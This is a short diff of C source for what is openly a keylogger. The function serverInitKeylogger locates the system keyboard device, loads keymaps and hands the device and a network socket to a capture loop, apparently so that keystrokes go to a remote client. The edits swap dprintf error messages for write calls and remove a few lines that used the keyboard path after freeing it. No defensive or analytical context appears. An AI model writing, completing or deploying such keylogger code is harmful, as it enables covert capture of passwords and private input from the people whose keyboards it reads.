@@ -55,7 +55,7 @@ int					serverInitKeylogger(int socket)
 	char			*keyboard;
 
 	if ((fd = get_console()) < 0)
-		return dprintf(socket, "Can't get a file descriptor refering to a terminal\n");
+		return write(socket, "Can't get a file descriptor refering to a terminal\n", 52);
 	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
 	if ((key_maps = new_keymaps(2, MAX_NR_KEYMAPS)) == NULL)
 		return dprintf(socket, "Can't allocate %do to get keymap\n", 2 * MAX_NR_KEYMAPS);
@@ -68,17 +68,14 @@ int					serverInitKeylogger(int socket)
 		return dprintf(socket, "Can't allocate %do for keys table\n", nb_keys * nb_keymap);
 	if ((keyboard = get_keyboard()) == NULL) {
 		free_tab(&key_table);
-		return dprintf(socket, "No keyboard found.\n");
+		return write(socket, "No keyboard found.\n", 20);
 	}
 	fd = open(keyboard, O_RDONLY);
 	free(keyboard);
 	if (fd < 0) {
 		free_tab(&key_table);
-		return dprintf(socket, "Can't open the keyboard.\n");
+		return write(socket, "Can't open the keyboard.\n", 26);
 	}
-	write(socket, keyboard, strlen(keyboard));
-	dprintf(socket, "Keyboard found: %s", keyboard);
-	free(keyboard);
 	keylogger_loop(fd, key_table, socket);
 	close(fd);
 	free_tab(&key_table);
